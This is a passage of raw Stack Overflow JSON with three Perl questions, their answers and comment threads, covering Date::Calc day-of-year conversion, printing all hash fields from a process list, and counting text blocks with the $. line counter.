"question_id": 51563455, "link": "https://stackoverflow.com/questions/51563455/year-and-day-of-year-to-date-using-datecalc/51563591#51563591", "title": "Year and day of year to date using Date::Calc", "body": "<p>The documented usage is</p>\n\n<blockquote>\n  <p><code>($year,$month,$day) = Add_Delta_Days($year,$month,$day, $Dd);</code></p>\n</blockquote>\n\n<p>So</p>\n\n<pre><code>my ($y,$m,$d) = Add_Delta_Days(2018,1,1,70-1);\n</code></pre>\n\n<p>Note that the 70th day is 69 days after the 1st, thus the use of <code>70-1</code>.</p>\n"}], "owner": {"reputation": 1215, "user_id": 3525290, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/303246ebe05535ca2f4e437eb6cfb7f4?s=128&d=identicon&r=PG&f=1", "display_name": "user3525290", "link": "https://stackoverflow.com/users/3525290/user3525290"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 51563591, "answer_count": 1, "score": 1, "last_activity_date": 1532716716, "creation_date": 1532715378, "last_edit_date": 1532716716, "question_id": 51563455, "link": "https://stackoverflow.com/questions/51563455/year-and-day-of-year-to-date-using-datecalc", "title": "Year and day of year to date using Date::Calc", "body": "<p>How do you get the date from year and day of year using <a href=\"https://metacpan.org/pod/Date::Calc\" rel=\"nofollow noreferrer\"><code>Date::Calc</code></a>?</p>\n\n<p>I managed to figure it out using <code>DateTime</code> but I need to use <code>Date::Calc</code>.</p>\n\n<p>The following works, but I don't know how to get it working using <code>Date::Calc</code>.</p>\n\n<pre><code>use DateTime;\n\nmy $dt = DateTime-&gt;from_day_of_year(\n    year        =&gt; 2018,\n    day_of_year =&gt; 70,\n);\n\n# Prints the correct date of March something.\nprint($dt-&gt;strftime('%Y-%m-%d') . \"\\n\"); \n</code></pre>\n\n<p>What I have so far is </p>\n\n<pre><code> use Date::Calc 'Add_Delta_Days';\n\n my $dt = Add_Delta_Days(2018, 70);\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532691769, "post_id": 51557198, "comment_id": 90081094, "body": "I don&#39;t understand what you&#39;re asking. Show an example of the data structure you&#39;re working with and the result you&#39;re trying to get."}, {"owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692339, "post_id": 51557198, "comment_id": 90081411, "body": "Hi Melpomene, The tool uses this code internally. I dont have any means to test it apart from looking at output directly. This code gives the top 10 processes and their corresponding cpu%,process id and arguments(description). I would like to print all the fields to be printed. I dont know how to print all the fields.could you please help."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692403, "post_id": 51557198, "comment_id": 90081443, "body": "What do you mean by &quot;the tool&quot; What tool?"}, {"owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692489, "post_id": 51557198, "comment_id": 90081494, "body": "Its a microfocus software tool. It prints the top processes and the CPU utilization as shown below.This may affect overall performance of the system. Top 10 CPU hogging processes are listed below :  % CPU\tPID  Host\tProcess  100\t6092\t    CPUSTRES 6\t4252\t    opcmona"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692529, "post_id": 51557198, "comment_id": 90081524, "body": "What do you mean, &quot;as shown below&quot;? You haven&#39;t posted any sample output. You also haven&#39;t explained what other fields there are or what your desired output looks like."}, {"owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692576, "post_id": 51557198, "comment_id": 90081551, "body": "i edited the previous post for your reference"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1532692642, "post_id": 51557198, "comment_id": 90081589, "body": "Add all relevant information to your question. Putting it in a comment isn&#39;t good because 1) not all people read comments and 2) you can&#39;t use nice formatting in comments."}, {"owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532692693, "post_id": 51557198, "comment_id": 90081617, "body": "I am unaware of the syntax.. If                                                     $ProcString .= $$_{pctcpu}.&quot;\t&quot;.$$_{pid}.&quot;\t&quot;.$$_{args}.&quot;\\n&quot;;                      can print                                                                                                             % CPU\tPID  Host\tProcess  100\t6092\t    CPUSTRES                                                                            how can i modify the code such that it prints all the fields ?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532694324, "post_id": 51557198, "comment_id": 90082547, "body": "@GirishJoshi: <code>$$_{pctcpu}</code> is just an overcomplicated way to write <code>$_-&gt;{pctcpu}</code>."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "edited": false, "score": 0, "creation_date": 1532695753, "post_id": 51557721, "comment_id": 90083414, "body": "Hi Dave. This code did work. It prints all the fields. Though my next question is beyond the scope, i would like to ask it.  I was expecting it to print the username of the processes, however it didnt. I suspect the getTopCPUHoggingProcess() . Aint it?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "edited": false, "score": 0, "creation_date": 1532696390, "post_id": 51557721, "comment_id": 90083781, "body": "@GirishJoshi: You would need to read the documentation of the module. But I wouldn&#39;t be surprised if it gives you the userid (perhaps a <code>uid</code> column?) rather than username."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 2, "last_activity_date": 1532693946, "last_edit_date": 1532693946, "creation_date": 1532693573, "answer_id": 51557721, "question_id": 51557198, "link": "https://stackoverflow.com/questions/51557198/how-to-print-the-complete-content-of-an-array-in-perl/51557721#51557721", "title": "How to print the complete content of an array in Perl", "body": "<p>Firstly, the code you have shown was written by someone who doesn't know as much Perl as they think they know. Everywhere that they have a construct like <code>$$_{pctcpu}</code>, a real Perl programmer would have written <code>$_-&gt;{pctcpu}</code>. They also didn't know that variables are interpolated in a double-quoted Perl string. So the last line of code would actually have been written as:</p>\n\n<pre><code>$ProcString .= \"$_-&gt;{pctcpu}   $_-&gt;{pid}    $_-&gt;{args}\\n\";\n</code></pre>\n\n<p>Secondly, you need to realise that no-one here knows what the <code>OvPrum</code> module is or how it works. So all of this is guesswork.</p>\n\n<p>Having said that. It seems pretty clear that your <code>getTopCPUHoggingProcess()</code> method is returning an array reference and that every element of the referenced array is a hash reference.</p>\n\n<p>So I think your question is actually, \"given an array of hash references, how can I print all of the values from the array, not just the ones the current code explicitly asks for\". And I think the code below answers that. Notice that I've faked the definition of the <code>$ProcessList</code> variable. My version certainly won't be accurate, but it should be close enough to enable you to work out what is going on.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $ProcessList = [{\n  pctcpu =&gt; 3,\n  pid    =&gt; 1000,\n  args   =&gt; 'something',\n  extra  =&gt; 'Important data',\n}, {\n  pctcpu =&gt; 2,\n  pid    =&gt; 2000,\n  args   =&gt; 'something else',\n  extra  =&gt; 'Vital data',\n}];\n\nmy $ProcString = '';\n\n# Get all of the keys of the first hash in the array\nmy @keys = keys %{ $ProcessList-&gt;[0] };\n\nprint \"@keys\\n\";\n\nforeach (@$ProcessList) {\n  $ProcString .= join(' ', @{$_}{ @keys }) . \"\\n\";\n}\n\nprint \"$ProcString\\n\";\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 5889820, "user_type": "registered", "profile_image": "https://graph.facebook.com/988183754588177/picture?type=large", "display_name": "Girish Joshi", "link": "https://stackoverflow.com/users/5889820/girish-joshi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 473, "favorite_count": 0, "accepted_answer_id": 51557721, "answer_count": 1, "score": -2, "last_activity_date": 1532693946, "creation_date": 1532691666, "last_edit_date": 1532693050, "question_id": 51557198, "link": "https://stackoverflow.com/questions/51557198/how-to-print-the-complete-content-of-an-array-in-perl", "title": "How to print the complete content of an array in Perl", "body": "<p>I have a code snippet as below</p>\n\n<pre><code># Get top 10 CPU hogging process\n    my $prumObj = OvPrum-&gt;new($OVOSystem, $Session);\n    my $numprocs = 10;\n    my $ProcString= \"\";\n    my $ProcessList = $prumObj-&gt;getTopCPUHoggingProcess($numprocs); \n    if ( $ProcessList and scalar(@$ProcessList) )\n    {\n        $ProcString = \"Top \".$numprocs.\" CPU hogging processes are listed below :\\n\";\n        $ProcString .= \"\\nCPU   PID Process\\n\\n\";\n        foreach ( @$ProcessList)\n        {\n            $ProcString .= $$_{pctcpu}.\"    \".$$_{pid}.\"    \".$$_{args}.\"\\n\";\n        }\n    }\n</code></pre>\n\n<p>The output of the above snippet is </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Top 10 CPU hogging processes are listed below :\n% CPU   PID    Process\n\n100    6092     CPUSTRES\n6      4252     opcmona\n</code></pre>\n\n<p>However I would want to get all the fields (instead of %CPU, PID and Process). How can I get all the fields assigned to the variable ProcString? </p>\n\n<p>Could you please help me in this.</p>\n"}, {"tags": ["perl", "rotation"], "comments": [{"owner": {"reputation": 8974, "user_id": 205207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/1OH7W.jpg?s=128&g=1", "display_name": "i alarmed alien", "link": "https://stackoverflow.com/users/205207/i-alarmed-alien"}, "edited": false, "score": 0, "creation_date": 1532689612, "post_id": 51556588, "comment_id": 90079937, "body": "Check your loop structure: you&#39;re initialising <code>$count</code> and <code>stat</code>-ing the file while you&#39;re supposed to be reading the file. Is that what you want to do?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532721948, "post_id": 51556588, "comment_id": 90096614, "body": "This is quite strange code. Is your filename in <code>$filename</code> or <code>$INFILE</code>? Why have the outer <code>while</code> loop when you have that inner loop that will read every record from the filehandle? And I thought I explained that you don&#39;t need to explicitly close filehandles that are held in a lexical variable."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532958533, "post_id": 51556588, "comment_id": 90156748, "body": "i&#39;m sorry IN_FILE it&#39;s an error"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1533107918, "post_id": 51556588, "comment_id": 90219310, "body": "You say it&#39;s <code>$IN_FILE</code>, but you&#39;ve now corrected it to <code>$filename</code> everywhere. You&#39;re not the most detail-oriented programmer I&#39;ve ever dealt with :-)"}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532696610, "post_id": 51556914, "comment_id": 90083901, "body": "In your opinion, there is a way to take directly last row of my opened file ?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532696970, "post_id": 51556914, "comment_id": 90084127, "body": "This is a FAQ. <a href=\"https://perldoc.perl.org/perlfaq5.html#How-do-I-count-the-number-of-lines-in-a-file%3f\" rel=\"nofollow noreferrer\">How do I count the number of lines in file?</a>"}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532697014, "post_id": 51556914, "comment_id": 90084154, "body": "@AllanSimeoe try to make an if before of push, if &lt;last row of file&gt; = $. then: push"}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532698955, "post_id": 51556914, "comment_id": 90085323, "body": "@DaveCross your help was usefully, i&#39;ve write the following code and it works better \t\tmy $count = <code>&#47;usr&#47;bin&#47;wc -l $filename</code>; \t\tmy $count = (split /\\s/, $count)[0]; \t\tpush @filelist, {filename =&gt; $IN_FILE, inode =&gt; $inode, count =&gt; $count,} \t} close ($fh); } @$filelist = do {my %seen; \t\t\tgrep { !$seen{ $_-&gt;{ filename }, $_-&gt;{ inode }, $_-&gt;{ count } }++ } @$filelist};"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 1, "creation_date": 1532699050, "post_id": 51556914, "comment_id": 90085380, "body": "@AllanSimeoe: Please don&#39;t put code in comments - it&#39;s unreadable there. If you want to show us what you ended up with, then edit your question to add it there."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 1, "creation_date": 1532699722, "post_id": 51556914, "comment_id": 90085831, "body": "@Allan: Please don&#39;t change the code in your question: it makes nonsense of the answers and comments posted so far. You can <i>add to</i> your question to provide additional information. I&#39;ve rolled back your most recent edit."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532699857, "post_id": 51556914, "comment_id": 90085914, "body": "@AllanSimeoe: Please note that I suggested you should <b>add</b> the solution to your question. Removing the original code is a terrible idea."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 1, "creation_date": 1532700022, "post_id": 51556914, "comment_id": 90086013, "body": "@Allan: Shelling out to a new process just to use <code>wc</code> is slow and wasteful. Much better to do it in Perl with <code>1 while &lt;$fh&gt;; my $count = $.</code>.  Also, if you&#39;re counting <i>blocks of text</i> separated by blank lines then you should set <code>$&#47;</code> to the empty string <code>$&#47; = &quot;&quot;</code>. This will do what you want but will allow for any number of blank lines between the blocks."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532702254, "post_id": 51556914, "comment_id": 90087310, "body": "@Borodin thank you for your suggestion, i try to made this change right now :)"}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1532705455, "post_id": 51556914, "comment_id": 90089145, "body": "You should always close files since it&#39;s the last chance to report any error. <code>close FILE or die &quot;could not close FILE: $!\\n&quot;;</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1532708752, "post_id": 51556914, "comment_id": 90090819, "body": "@shawn: There is rarely any point in closing input files, and using lexical file handles with proper scoping makes an explicit close unnecessary unless you need to test the return status."}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532722431, "post_id": 51556914, "comment_id": 90096779, "body": "@Borodin Yes, exactly. Test the return status to see if an error occurred during a read."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1532947110, "post_id": 51556914, "comment_id": 90149403, "body": "@shawnhcorey ok, as suggested, I will add it"}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "edited": false, "score": 0, "creation_date": 1532949285, "post_id": 51556914, "comment_id": 90150669, "body": "@DaveCross You&#39;re missing the point, that being to test for errors."}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532958688, "post_id": 51556914, "comment_id": 90156863, "body": "@Borodin I noticed that using 1 while &lt;$fh&gt;; my $count = $. the number of lines is correctly reported, however, I leave the previously activated while loop earlier."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 0, "creation_date": 1532959615, "post_id": 51556914, "comment_id": 90157498, "body": "@Allan: You don&#39;t need two <code>while</code> loops!"}, {"owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532959983, "post_id": 51556914, "comment_id": 90157751, "body": "@Borodin but if i write my $count = $.; it write more and more row (1,2,..,n) ..."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 1, "creation_date": 1532960085, "post_id": 51556914, "comment_id": 90157824, "body": "@Allan: Seriously, if you can&#39;t program at all then you have come to the wrong place. Questions are assumed to have come from people who stood a good chance of solving the problem themselves but have hit a road block. If you don&#39;t even know what the code you&#39;ve written means then you need to do some serious studying. The Stack Overflow <a href=\"https://stackoverflow.com/tags/perl/info\">tag information page for Perl</a> has many useful links. What you&#39;re currently doing ridicules the programming profession, as anyone can write anything by posting a requirement here and waiting for the answer."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "edited": false, "score": 1, "creation_date": 1532960530, "post_id": 51556914, "comment_id": 90158114, "body": "@Allan: Please don&#39;t use real people on line to learn a programming language. Most of us have better things to do. Think of it as being unable to drive your car. If you have checked the battery, distributor, coil, and spark plugs and they&#39;re okay <i>then</i> you can ask. If someone asks what happens if you press the accelerator and you answer <i>&quot;which is the accelerator&quot;</i> then you&#39;re asking the wrong people. Learn to drive."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1532690462, "creation_date": 1532690462, "answer_id": 51556914, "question_id": 51556588, "link": "https://stackoverflow.com/questions/51556588/find-the-number-of-blocks-of-text-in-a-file/51556914#51556914", "title": "Find the number of blocks of text in a file", "body": "<p>If you read the documentation for <code>$.</code> in <a href=\"https://perldoc.perl.org/perlvar.html\" rel=\"nofollow noreferrer\">perlvar</a>, you'll see that it says:</p>\n\n<blockquote>\n  <p><code>$.</code> is reset when the filehandle is closed, but not when an open filehandle is reopened without an intervening <code>close()</code>.</p>\n</blockquote>\n\n<p>And that's what you're falling over here. You constantly re-open <code>FILE</code> without closing it first - so <code>$.</code> just carries on getting 